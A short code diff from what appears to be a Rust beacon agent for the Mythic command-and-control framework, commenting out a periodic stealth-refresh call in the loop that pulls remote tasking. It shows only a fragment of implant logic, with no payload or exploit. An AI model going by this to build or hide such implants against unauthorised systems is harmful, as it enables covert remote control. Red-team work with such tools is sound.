@@ -110,7 +110,7 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
     // Main agent loop
     loop {
         // Refresh stealth measures periodically
-        stealth::refresh_protection()?;
+        // stealth::refresh_protection()?;
 
         // Get new tasking from Mythic
         let pending_tasks = agent.get_tasking()?;
